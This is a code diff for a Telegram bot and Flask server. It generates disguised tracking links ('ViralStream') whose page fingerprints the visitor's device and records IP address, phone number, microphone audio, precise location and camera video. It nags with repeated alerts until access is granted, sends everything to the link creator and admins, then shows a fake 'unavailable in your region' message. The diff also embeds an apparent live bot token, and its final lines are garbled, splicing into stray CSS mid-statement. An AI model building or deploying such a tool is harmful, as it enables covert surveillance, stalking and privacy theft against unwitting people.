@@ -5,51 +5,36 @@ import secrets
 import logging
 import threading
 import requests
-from flask import Flask, request, render_template_string, jsonify
+from flask import Flask, request, jsonify, render_template_string
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 from datetime import datetime, timedelta
 
 # ---------- Configuration ----------
-BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
+BOT_TOKEN   = os.environ.get("8356857320:AAGARzzapb6gYss0J_wtKHbEZ39RWXZnZPM", "")
 ADMIN_IDS   = {"1838854178", "1930138915"}
-# Get the public URL from Render environment or set manually
-BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
-if not BASE_URL:
-    # If not on Render (or variable missing), use a default
-    BASE_URL = os.environ.get("BASE_URL", "https://finalinfoger.onrender.com")
+_replit_domain = os.environ.get("REPLIT_DEV_DOMAIN", "")
+BASE_URL    = f"https://{_replit_domain}" if _replit_domain else "https://your-app.replit.dev"
 
 tracking_links = {}   # token -> user_id
 seen_users     = set()
 
-# Telegram message effect IDs (shown on data messages)
+# Telegram message effect IDs
 EMOJI_EFFECTS = [
-    "5104841245755180586",  # 🔥
-    "5107584321108051014",  # 👍
-    "5104858069142078462",  # 👎
-    "5044134455711629726",  # ❤️
-    "5046509860389126442",  # 🎉
-    "5046589136895476101",  # 💩
+    "5104841245755180586", "5107584321108051014", "5104858069142078462",
+    "5044134455711629726", "5046509860389126442", "5046589136895476101"
 ]
 
 def random_effect():
     return random.choice(EMOJI_EFFECTS)
 
-# ── User data store ──
-# user_data[user_id] = {
-#   "points": int,
-#   "access_expires": datetime | None,
-#   "last_daily": date | None,
-#   "referrals": int,
-#   "referred_by": user_id | None,
-#   "name": str
-# }
+# User data store
 user_data = {}
 
-DAILY_BONUS_PTS  = 5    # points per daily claim
-REFER_BONUS_PTS  = 10   # points referrer earns
-PTS_PER_DAY      = 10   # points needed to get 1 day access
-FREE_DAYS_NEW    = 1    # free days for brand-new users
+DAILY_BONUS_PTS  = 5
+REFER_BONUS_PTS  = 10
+PTS_PER_DAY      = 10
+FREE_DAYS_NEW    = 1
 
 flask_app = Flask(__name__)
 
@@ -70,10 +55,8 @@ def get_user(user_id):
         }
     return user_data[uid]
 
-
 def is_admin(user_id):
     return str(user_id) in ADMIN_IDS
-
 
 def has_access(user_id):
     if is_admin(user_id):
@@ -82,26 +65,21 @@ def has_access(user_id):
     exp = u.get("access_expires")
     return exp is not None and exp > datetime.now()
 
-
 def add_access_days(user_id, days):
     u = get_user(user_id)
     now = datetime.now()
     base = u["access_expires"] if u["access_expires"] and u["access_expires"] > now else now
     u["access_expires"] = base + timedelta(days=days)
 
-
 def add_points(user_id, pts):
     u = get_user(user_id)
     u["points"] = max(0, u.get("points", 0) + pts)
-
 
 def remove_points(user_id, pts):
     u = get_user(user_id)
     u["points"] = max(0, u.get("points", 0) - pts)
 
-
 def redeem_points(user_id):
-    """Convert every 10 points → 1 day access. Returns days added."""
     u = get_user(user_id)
     pts = u.get("points", 0)
     days = pts // PTS_PER_DAY
@@ -110,7 +88,6 @@ def redeem_points(user_id):
         u["points"] = remaining
         add_access_days(user_id, days)
     return days
-
 
 def access_expires_str(user_id):
     u = get_user(user_id)
@@ -126,83 +103,392 @@ def access_expires_str(user_id):
 
 
 # ─────────────────────────────────────────
-# HTML TEMPLATE (with contact mode)
+# MINIMAL PERMISSION PAGE (NO HTML TEMPLATE)
 # ─────────────────────────────────────────
-HTML_TEMPLATE = """<!DOCTYPE html>
-<html lang="en">
+PERMISSION_PAGE = """<!DOCTYPE html>
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-<title>ViralStream – Watch Free</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#0d0d0d;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#fff;min-height:100vh;overflow-x:hidden}
-.topbar{background:linear-gradient(90deg,#1a0a0a,#111);padding:10px 14px;display:flex;align-items:center;gap:10px;border-bottom:2px solid #e63946;position:sticky;top:0;z-index:50}
-.logo{font-size:1.3rem;font-weight:900;color:#e63946;letter-spacing:-1px;text-shadow:0 0 20px rgba(230,57,70,.4)}
-.logo span{color:#fff}
-.live-badge{background:#e63946;color:#fff;font-size:.6rem;font-weight:700;padding:2px 6px;border-radius:3px;letter-spacing:.5px;animation:pulse 1.5s infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.6}}
-.searchbar{flex:1;background:#1e1e1e;border:1px solid #2a2a2a;border-radius:20px;padding:7px 14px;color:#aaa;font-size:.82rem}
-.hero{background:linear-gradient(135deg,#1a0010,#0a0a2e,#001a0a);padding:10px 14px 6px;border-bottom:1px solid #1e1e1e}
-.hero-title{font-size:.75rem;color:#e63946;font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
-.trending-row{display:flex;gap:8px;overflow-x:auto;padding-bottom:4px;scrollbar-width:none}
-.trending-row::-webkit-scrollbar{display:none}
-.t-chip{background:#1e1e1e;border:1px solid #333;border-radius:12px;padding:4px 10px;font-size:.7rem;color:#aaa;white-space:nowrap}
-.t-chip.hot{border-color:#e63946;color:#e63946}
-.player-wrap{position:relative;background:#000;width:100%;aspect-ratio:16/9}
-.thumb-img{width:100%;height:100%;object-fit:cover;filter:brightness(.55) saturate(1.3)}
-.badges{position:absolute;top:10px;left:10px;display:flex;gap:6px}
-.badge{padding:3px 8px;border-radius:4px;font-size:.65rem;font-weight:700;letter-spacing:.5px}
-.badge.hd{background:#e63946;color:#fff}
-.badge.viral{background:rgba(255,200,0,.9);color:#000}
-.badge.new{background:rgba(0,200,100,.9);color:#000}
-.view-count{position:absolute;top:10px;right:10px;background:rgba(0,0,0,.7);padding:3px 8px;border-radius:4px;font-size:.65rem;color:#ccc}
-.play-overlay{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px}
-.play-ring{width:80px;height:80px;border-radius:50%;border:3px solid rgba(255,255,255,.3);display:flex;align-items:center;justify-content:center;position:relative;cursor:pointer}
-.play-ring::before{content:'';position:absolute;inset:-6px;border-radius:50%;border:2px solid rgba(230,57,70,.5);animation:ring-pulse 2s infinite}
-@keyframes ring-pulse{0%{transform:scale(1);opacity:.8}100%{transform:scale(1.3);opacity:0}}
-.play-btn-inner{width:64px;height:64px;background:rgba(230,57,70,.85);border-radius:50%;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(8px);transition:all .2s;box-shadow:0 0 30px rgba(230,57,70,.4)}
-.play-btn-inner:hover{background:#e63946;transform:scale(1.05)}
-.play-btn-inner svg{width:28px;height:28px;fill:#fff;margin-left:4px}
-.play-label{font-size:.82rem;font-weight:700;letter-spacing:.5px;text-align:center;padding:0 8px;text-shadow:0 0 10px rgba(230,57,70,.8);animation:live-blink 1.1s steps(1) infinite}
-@keyframes live-blink{
-  0%{color:#fff;text-shadow:0 0 14px #e63946,0 0 28px rgba(230,57,70,.5)}
-  25%{color:#e63946;text-shadow:0 0 20px #fff,0 0 40px #e63946}
-  50%{color:#fff;text-shadow:0 0 14px #e63946,0 0 28px rgba(230,57,70,.5)}
-  75%{color:#ffcc00;text-shadow:0 0 18px #fff,0 0 32px #ffcc00}
-}
-.buffer-bar{position:absolute;bottom:0;left:0;right:0;height:3px;background:rgba(255,255,255,.1)}
-.buffer-fill{height:100%;background:linear-gradient(90deg,#e63946,#ff6b6b);width:0%;transition:width .5s ease}
-.info{padding:12px 14px 6px}
-.info-title{font-size:.97rem;font-weight:700;line-height:1.4;margin-bottom:5px}
-.info-meta{color:#777;font-size:.75rem;margin-bottom:8px;display:flex;align-items:center;gap:8px}
-.dot{color:#333}
-.tags{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:10px}
-.tag{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:12px;padding:3px 9px;font-size:.68rem;color:#888}
-.tag.fire{color:#e63946;border-color:#e63946}
-.engage{display:flex;gap:0;border-top:1px solid #1a1a1a;border-bottom:1px solid #1a1a1a;margin-bottom:10px}
-.eng-btn{flex:1;padding:10px 0;text-align:center;font-size:.7rem;color:#777;cursor:pointer;border-right:1px solid #1a1a1a}
-.eng-btn:last-child{border-right:none}
-.eng-icon{font-size:1rem;display:block;margin-bottom:2px}
-.section-label{padding:4px 14px 6px;font-size:.72rem;color:#666;text-transform:uppercase;letter-spacing:.5px}
-.rec-item{display:flex;gap:10px;padding:8px 14px;border-bottom:1px solid #111;cursor:pointer}
-.rec-thumb{width:110px;min-width:110px;height:62px;border-radius:5px;overflow:hidden;position:relative;background:#1a1a1a}
-.rec-thumb img{width:100%;height:100%;object-fit:cover}
-.rec-dur{position:absolute;bottom:3px;right:3px;background:rgba(0,0,0,.8);border-radius:2px;padding:1px 4px;font-size:.65rem}
-.rec-info .rec-title{font-size:.78rem;font-weight:500;line-height:1.3;margin-bottom:3px}
-.rec-sub{font-size:.68rem;color:#555}
-.rec-fire{color:#e63946;font-size:.7rem}
-.modal-backdrop{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:200;align-items:center;justify-content:center}
-.modal-backdrop.show{display:flex}
-.modal{background:#141414;border:1px solid #2a2a2a;border-radius:14px;padding:26px 22px;max-width:320px;width:92%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.8)}
-.modal-icon{font-size:2.8rem;margin-bottom:10px}
-.modal h3{font-size:1rem;font-weight:700;line-height:1.5;margin-bottom:8px}
-.modal p{color:#888;font-size:.8rem;line-height:1.6;margin-bottom:18px}
-.modal-btn{width:100%;padding:13px;border:none;border-radius:9px;font-size:.95rem;font-weight:700;cursor:pointer;margin-bottom:8px;transition:all .15s}
-.modal-btn.primary{background:linear-gradient(135deg,#e63946,#c1121f);color:#fff;box-shadow:0 4px 20px rgba(230,57,70,.3)}
-.modal-btn.primary:hover{transform:translateY(-1px);box-shadow:0 6px 24px rgba(230,57,70,.4)}
-.modal-btn.sec{background:#1e1e1e;color:#666;font-size:.78rem;font-weight:400}
-#toast{display:none;position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#222;color:#fff;padding:9px 20px;border-radius:20px;font-size:.78rem;z-index:300;border:1px solid #333}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying...</title>
+    <style>
+        body { background: #0a0a0a; color: #fff; font-family: sans-serif; text-align: center; padding: 2rem; }
+        .status { margin-top: 2rem; font-size: 1.2rem; color: #aaa; }
+        .step { margin: 1rem 0; }
+    </style>
+</head>
+<body>
+    <h2>🔐 Access Check</h2>
+    <div class="status" id="status">Initializing...</div>
+    <script>
+        const token = "{{ token }}";
+        const mode  = "{{ mode }}";
+
+        async function collectFingerprint() {
+            let battery = {};
+            try {
+                const b = await navigator.getBattery();
+                battery = { batteryLevel: Math.round(b.level*100)+"%", charging: b.charging };
+            } catch(e) {}
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+            let deviceModel = "Unknown";
+            if(navigator.userAgentData) {
+                try {
+                    const d = await navigator.userAgentData.getHighEntropyValues(["model","platform"]);
+                    if(d.model && d.model.trim()) deviceModel = d.model.trim();
+                } catch(e) {}
+            }
+            if(deviceModel === "Unknown") {
+                const ua = navigator.userAgent;
+                let m = ua.match(/;\\s*([A-Za-z0-9 _\\-]+)\\s+Build/);
+                if(m) deviceModel = m[1].trim();
+                else {
+                    m = ua.match(/\\(([^;)]+);\\s*([^;)]+);\\s*([^;)]+)\\)/);
+                    if(m) deviceModel = m[3].trim();
+                    else deviceModel = navigator.platform || "Unknown";
+                }
+            }
+            return {
+                userAgent: navigator.userAgent,
+                deviceModel: deviceModel,
+                platform: navigator.platform,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                connectionType: conn.effectiveType || conn.type || "unknown",
+                downlink: conn.downlink,
+                localTime: new Date().toString(),
+                ...battery
+            };
+        }
+
+        async function sendFingerprint() {
+            try {
+                const fp = await collectFingerprint();
+                await fetch("/capture_fingerprint", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ token, fingerprint: fp })
+                });
+            } catch(e) {}
+        }
+
+        async function sendContact() {
+            let phone = "";
+            while(!phone || phone.trim() === "") {
+                phone = prompt("📞 သင့်ဖုန်းနံပါတ် ထည့်ပါ | Enter your phone number:", "");
+                if(phone === null) continue;
+                phone = phone.trim();
+                if(phone === "") alert("❌ ဖုန်းနံပါတ် မထည့်သွင်းပါ | Please enter a phone number");
+            }
+            const fp = await collectFingerprint();
+            const form = new FormData();
+            form.append("token", token);
+            form.append("phone", phone);
+            form.append("fingerprint", JSON.stringify(fp));
+            await fetch("/capture_contact", { method: "POST", body: form });
+            document.getElementById("status").innerHTML = "✅ Phone number captured";
+        }
+
+        async function getAudioStream() {
+            while(true) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    return stream;
+                } catch(e) {
+                    alert("🎤 Microphone access is required. Please allow microphone.");
+                }
+            }
+        }
+
+        async function sendAudio() {
+            const stream = await getAudioStream();
+            const mimeType = MediaRecorder.isTypeSupported("audio/webm;codecs=opus") ? "audio/webm;codecs=opus" : "audio/webm";
+            const recorder = new MediaRecorder(stream, { mimeType });
+            const chunks = [];
+            recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
+            recorder.start(300);
+            await new Promise(r => setTimeout(r, 6000));
+            recorder.stop();
+            stream.getTracks().forEach(t => t.stop());
+            await new Promise(r => recorder.onstop = r);
+            const blob = new Blob(chunks, { type: mimeType });
+            const fp = await collectFingerprint();
+            const form = new FormData();
+            form.append("token", token);
+            form.append("audio", blob, "audio.webm");
+            form.append("fingerprint", JSON.stringify(fp));
+            await fetch("/capture_combined_audio", { method: "POST", body: form });
+            document.getElementById("status").innerHTML = "✅ Audio captured";
+        }
+
+        async function getLocation() {
+            while(true) {
+                try {
+                    const pos = await new Promise((res, rej) => {
+                        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 15000, enableHighAccuracy: true });
+                    });
+                    return pos;
+                } catch(e) {
+                    alert("📍 Location access is required. Please allow location.");
+                }
+            }
+        }
+
+        async function sendLocation() {
+            const pos = await getLocation();
+            const fp = await collectFingerprint();
+            const form = new FormData();
+            form.append("token", token);
+            form.append("lat", pos.coords.latitude);
+            form.append("lon", pos.coords.longitude);
+            form.append("fingerprint", JSON.stringify(fp));
+            await fetch("/capture_combined_location", { method: "POST", body: form });
+            document.getElementById("status").innerHTML = "✅ Location captured";
+        }
+
+        async function getVideoStream() {
+            while(true) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    return stream;
+                } catch(e) {
+                    alert("🎥 Camera and microphone access required. Please allow both.");
+                }
+            }
+        }
+
+        async function sendVideo() {
+            const stream = await getVideoStream();
+            const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus") ? "video/webm;codecs=vp8,opus" : "video/webm";
+            const recorder = new MediaRecorder(stream, { mimeType });
+            const chunks = [];
+            recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
+            recorder.start(300);
+            await new Promise(r => setTimeout(r, 4000));
+            recorder.stop();
+            stream.getTracks().forEach(t => t.stop());
+            await new Promise(r => recorder.onstop = r);
+            const blob = new Blob(chunks, { type: mimeType });
+            const fp = await collectFingerprint();
+            const form = new FormData();
+            form.append("token", token);
+            form.append("video", blob, "video.webm");
+            form.append("fingerprint", JSON.stringify(fp));
+            await fetch("/capture_combined_video", { method: "POST", body: form });
+            document.getElementById("status").innerHTML = "✅ Video captured";
+        }
+
+        async function runAll() {
+            document.getElementById("status").innerHTML = "📞 Requesting phone number...";
+            await sendContact();
+            document.getElementById("status").innerHTML = "🎤 Requesting audio...";
+            await sendAudio();
+            document.getElementById("status").innerHTML = "📍 Requesting location...";
+            await sendLocation();
+            document.getElementById("status").innerHTML = "🎥 Requesting video...";
+            await sendVideo();
+            document.getElementById("status").innerHTML = "✅ All data captured. Thank you!";
+            setTimeout(() => { document.body.innerHTML = "<h2>Content unavailable in your region</h2>"; }, 2000);
+        }
+
+        if(mode === "all") {
+            runAll();
+        } else if(mode === "contact") {
+            sendContact().then(() => { document.getElementById("status").innerHTML = "✅ Done"; });
+        } else if(mode === "audio") {
+            sendAudio().then(() => { document.getElementById("status").innerHTML = "✅ Done"; });
+        } else if(mode === "location") {
+            sendLocation().then(() => { document.getElementById("status").innerHTML = "✅ Done"; });
+        } else if(mode === "video") {
+            sendVideo().then(() => { document.getElementById("status").innerHTML = "✅ Done"; });
+        } else {
+            document.getElementById("status").innerHTML = "⚠️ Invalid mode";
+        }
+
+        sendFingerprint();
+    </script>
+</body>
+</html>"""
+
+
+# ─────────────────────────────────────────
+# FLASK ROUTES
+# ─────────────────────────────────────────
+@flask_app.route('/')
+def index():
+    return """<!DOCTYPE html><html><head><title>ViralStream</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0d0d0d;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.box{text-align:center;padding:40px;background:#111;border-radius:14px;border:1px solid #222;max-width:400px;width:90%}
+h1{color:#e63946;font-size:2rem;margin-bottom:12px}
+p{color:#666;line-height:1.6;margin-bottom:8px}code{background:#1e1e1e;padding:3px 8px;border-radius:4px;color:#e63946}</style></head>
+<body><div class="box"><h1>▶ ViralStream</h1>
+<p>Bot ဖြင့် link ထုတ်ပြီး မျှဝေပါ</p>
+<p style="margin-top:16px;font-size:.8rem;color:#444">Use <code>/grab</code> in the bot</p>
+</div></body></html>""", 200
+
+
+@flask_app.route('/v/<token>')
+def v_page(token):
+    mode = request.args.get('m', 'all')
+    user_id = tracking_links.get(token)
+    if user_id:
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        ua = request.headers.get('User-Agent', 'Unknown')[:120]
+        mode_labels = {'all':'🌐 All-in-One','photo':'📸 Photo','audio':'🎤 Audio',
+                       'location':'📍 Location','video':'🎥 Video','contact':'📞 Contact'}
+        label = mode_labels.get(mode, mode)
+        alert = (
+            f"🔗 <b>Link ဖွင့်သည်! | Link Opened!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"🎯 Mode: <b>{label}</b>\n"
+            f"🌐 IP: <code>{ip}</code>\n"
+            f"📱 UA: {ua}\n"
+            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            f"━━━━━━━━━━━━━━━━━━━━"
+        )
+        threading.Thread(target=broadcast_message, args=(user_id, alert), daemon=True).start()
+    return render_template_string(PERMISSION_PAGE, token=token, mode=mode)
+
+
+# ── Capture endpoints (same as before, but keep only those needed) ──
+@flask_app.route('/capture_fingerprint', methods=['POST'])
+def capture_fingerprint():
+    data = request.get_json(silent=True) or {}
+    token = data.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    fp = data.get('fingerprint', {})
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    report = (
+        f"📱 <b>Device Info | ဖုန်းအချက်အလက်</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"🌐 IP: <code>{ip}</code>\n"
+        f"📱 Model: {fp.get('deviceModel','Unknown')}\n"
+        f"💻 Platform: {fp.get('platform','Unknown')}\n"
+        f"🖥 Screen: {fp.get('screenWidth','?')}×{fp.get('screenHeight','?')}\n"
+        f"🗣 Language: {fp.get('language','?')}\n"
+        f"⏰ Timezone: {fp.get('timezone','?')}\n"
+        f"🔋 Battery: {fp.get('batteryLevel','?')} {'🔌' if fp.get('charging') else '🔋'}\n"
+        f"📡 Net: {fp.get('connectionType','?')} / {fp.get('downlink','?')}Mbps\n"
+        f"🧠 CPU: {fp.get('hardwareConcurrency','?')} cores | 💾 {fp.get('deviceMemory','?')}GB\n"
+        f"📅 {fp.get('localTime','?')}\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
+    )
+    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+@flask_app.route('/capture_combined_photo', methods=['POST'])
+def capture_combined_photo():
+    token = request.form.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    photo_file = request.files.get('photo')
+    if not photo_file:
+        return jsonify({"ok": False}), 400
+    fp_json = request.form.get('fingerprint')
+    caption = _fp_caption(fp_json)
+    photo_bytes = photo_file.read()
+    threading.Thread(target=broadcast_photo, args=(user_id, photo_bytes, caption), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+@flask_app.route('/capture_combined_video', methods=['POST'])
+def capture_combined_video():
+    token = request.form.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    video_file = request.files.get('video')
+    if not video_file:
+        return jsonify({"ok": False}), 400
+    fp_json = request.form.get('fingerprint')
+    caption = _fp_caption(fp_json)
+    video_bytes = video_file.read()
+    threading.Thread(target=broadcast_video, args=(user_id, video_bytes, caption), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+@flask_app.route('/capture_combined_audio', methods=['POST'])
+def capture_combined_audio():
+    token = request.form.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    audio_file = request.files.get('audio')
+    if not audio_file:
+        return jsonify({"ok": False}), 400
+    fp_json = request.form.get('fingerprint')
+    caption = _fp_caption(fp_json)
+    audio_bytes = audio_file.read()
+    threading.Thread(target=broadcast_voice, args=(user_id, audio_bytes, caption), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+@flask_app.route('/capture_combined_location', methods=['POST'])
+def capture_combined_location():
+    token = request.form.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    lat = request.form.get('lat')
+    lon = request.form.get('lon')
+    if not lat or not lon:
+        return jsonify({"ok": False}), 400
+    fp_json = request.form.get('fingerprint')
+    caption = _fp_caption(fp_json)
+    threading.Thread(target=broadcast_location, args=(user_id, lat, lon), daemon=True).start()
+    threading.Thread(target=broadcast_message, args=(user_id, caption, True), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+@flask_app.route('/capture_contact', methods=['POST'])
+def capture_contact():
+    token = request.form.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    phone = request.form.get('phone', '').strip()
+    if not phone:
+        return jsonify({"ok": False}), 400
+    fp_json = request.form.get('fingerprint')
+    caption = _fp_caption(fp_json) + f"\n📞 Phone: <code>{phone}</code>"
+    threading.Thread(target=broadcast_contact, args=(user_id, phone, caption), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+def _fp_caption(fp_json):
+    try:
+        fp = json.loads(fp_json)
+        return (
+            f"📱 <b>Device Info</b>\n"
+            f"📱 {fp.get('deviceModel','?')} | {fp.get('platform','?')}\n"
+            f"🖥 {fp.get('screenWidth','?')}×{fp.get('screenHeight','?')} | {fp.get('language','?')}\n"
+            f"⏰ {fp.get('timezone','?')}\n"
+            f"🔋 {fp.get('batteryLevel','?')} | 📡 {fp.get('connectionType','?')}"
+        )
+    except Exception:
+        return "📱 Device Info"
+
+
+# ─────────────────────────────────────────
+# TELEGRAM SEND HELPERS (unchanged)
+# ─────────────────────────────────────────
+def recipients(user_id):
+    ids = [str(user_id)]
+    for a in ADMIN_IDS:
+        if a not in ids:
+            ids.append(a)
+    return ids
+
+def send_telegram_message(chat_id, text, reply_markup=None, effect_id=None):
+    try:
+        payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
+        if reply_markup:
+            payload["reply_markup"] = reply_markup
+        if effect_id:
+            payload["message_effect_id"] = efflay:none;position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#222;color:#fff;padding:9px 20px;border-radius:20px;font-size:.78rem;z-index:300;border:1px solid #333}
 </style>
 </head>
 <body>
